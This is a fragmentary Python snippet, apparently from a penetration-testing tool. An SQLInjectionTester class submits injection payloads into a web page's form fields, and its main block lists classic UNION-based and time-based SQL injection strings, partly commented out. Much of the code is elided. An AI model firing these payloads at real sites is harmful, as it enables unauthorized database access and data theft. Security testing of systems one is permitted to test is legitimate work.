        ...
        for name in self.field_names:
            for payload_type, (description, payload) in self.injection_payloads.items():
                ...
                try:
                    ...
                    time.sleep(5)  # Wait for the page to process the payload
...
if __name__ == "__main__":
    ...
    payloads = {
        ...
        ### "3": ["Blind Injection", "' OR '1'='1' UNION SELECT NULL,NULL,NULL --"],
       ### "4": ["Time-based Payload", "' OR SLEEP(5) --"]
    }

    tester = SQLInjectionTester(target_url, payloads)
    tester.extract_input_field_names()
    tester.test_payloads()

    print("[INFO] Testing completed. Results:")
